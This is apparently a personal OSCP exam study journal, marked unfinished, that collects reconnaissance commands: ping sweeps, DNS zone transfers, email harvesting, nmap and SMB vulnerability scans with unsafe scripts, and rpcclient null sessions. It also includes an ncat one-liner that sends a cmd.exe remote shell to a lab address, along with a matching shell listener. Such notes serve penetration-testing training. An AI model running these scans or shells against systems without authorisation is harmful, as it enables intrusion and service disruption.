# OSCP Journal

## General

Check if a service is running
```bash
root@kali:~# netstat -antp | grep sshd
```

Pull out hyperlinks from within a webpage:
```bash
grep "href=" index.html | cut -d "/" -f 3 | grep "\." | cut -d '"' -f 1 | sort -u
```

Output it to a file:
```bash
cat index.html | grep -o 'http://[^"]*' | cut -d "/" -f 3 | sort -u > list.txt
`for url in $(cat list.txt); do host $url; done
```

Bash-loop one-liner: (Add an '&' at the end of the line to background each loop to speed it up)
```bash
for targets in $(echo x.x.x.{0..255} | tr ' ' '\n'); do ping -c 2 $targets; done
```

Basic python loop:
```python
#!/usr/bin/python
import subprocess

target_range = "10.11.1."

for x in range(1,254):
	address_list = target_range + str(x)
	res = subprocess.call(['ping', '-c', '1', address_list])
	
	print address_list
```

### Ncat

Connect:
```bash
ncat -nve cmd.exe 10.11.0.37 444 --ssl 
```

Listen:
```bash
ncat -vl 444 --ssl  
```

Restrict IP connection
```bash
ncat --exec cmd.exe --allow x.x.x.x -vln 444 --ssl  
```

### Wireshark/tcpdump

Display filter:
```
tcp.port == 110
```

Filter traffic on a specific port
```
tcpdump -i <int> -n port 110
```

### Google-Fu

```
site:website.com
inurl:website.com "admin"
site:website.com filetype:docx
```
## Enumeration

### Email Harvester

```bash
root@kali:~# theharvester -d website.com -b google >google.txt
```

### whois

```bash
root@kali:~# whois website.com
```

Reverse lookups:
```bash
root@kali:~# whois x.x.x.x
```

### Recon-ng

```bash
root@kali:~# recon-ng
[recon-ng][default] > use recon/domains-contacts/whois_pocs
[recon-ng][default][whois_pocs] > show options
[recon-ng][default][whois_pocs] > set SOURCE website.com
[recon-ng][default][whois_pocs] > run
```

Search for vulnerabilties:
```bash
use recon/domains-vulnerabilities/....
```

### DNS

**host**

```bash
root@kali:~# host -t mx website.com
root@kali:~# host -t ns website.com
```

Check against subdomains from a list:
Create a list.txt full of names.

```bash
for ip in $(cat list.txt);do host $ip.website.com;done
```

**Zone transfer**

```bash
root@kali:~# host -l <domain name> <dns server address>
```

Clean it up:
```bash
root@kali:~# host -t ns website.com | cut -d " " -f 4
```

**DNSRecon**

```bash
root@kali:~# dnsrecon -d website.com -t axfr
```

**DNSEnum**

```bash
root@kali:~# dnsenum website.me
```

**DNS Nmap zone transfer**
```bash
nmap --script=dns-zone-transfer -p 53 ns1.website.com
```

### Port Scanning

nc connect/tcp scanning:
```bash
root@kali:~# nc -nvv -w 1 -z <ip> <port-range>
```

nc udp scanning
```bash
root@kali:~# nc -nv -u -z -w 1 <ip> <port-range>
```



**NMAP**

Ping scan and output to a grepable file
```bash
root@kali:~# nmap -sn -oG <filename.txt> <ip or range>
```

Cleanup results:
```bash
root@kali:~# grep Up <filename.txt> | cut -d " " -f 2 > <final-filename.txt>
```

Perform a quick service discovery on a list of IPs and output to another list against top 10 ports
```bash
root@kali:~# nmap -v -sV --top-ports=10 -iL <inputfilename.txt> -oG <outputfilename.txt>
```

Quick web sweep:
```bash
root@kali:~# nmap -p 80 <iprange>
```

OS Fingerprint:
```bash
root@kali:~# nmap -O <ip>
```

Sometimes if a host is UP but reports down. Add --disable-arp-ping:
```bash
nmap -v -p 445 --script=smb-vuln-* --script-args=unsafe-1 <ip> **--disable-arp-ping**
```

### SMB Enumeration

Check for smb vuln:
```bash
nmap -v -p 139,445 --script=smb-vuln-* --script-args=unsafe=1 -iL <filename.txt>
```

Nmap SMB scripts:
```bash
root@kali:~# ls -l /usr/share/nmap/scripts/smb*
```

Nmap NSE safe options:
```bash
unsafe == 1: kinda-safe
unsafe == 2: very unsafe
unsafe == anything_else: very safe
```

nbtscan (NetBIOS scanner)
```bash
root@kali:~# nbtscan -f <filename.txt>
root@kali:~# nbtscan -r <ip/cidr>
```

Enum4linux bash-loop:
```bash
for targets in $(cat <filename.txt>); do enum4linux $targets; done
```

rpclient
```bash
rpcclient -U "" <IP>
rpcclient$>srvinfo (server info and version)
enumdomusers (list users)
getdompwinfo (password policy)
```


Determine which servers are running Windows:
```bash
awk -F "OS: " '/^Nmap/ {a=$0} /OS: Windows/ {print a"\n"FS$2}' <smb-server-list.txt> | grep "Nmap" | cut -d " " -f 5 > smb-servers-running-windows.txt
```

> WORK IN PROGRESS
> WORK IN PROGRESS
> WORK IN PROGRESS
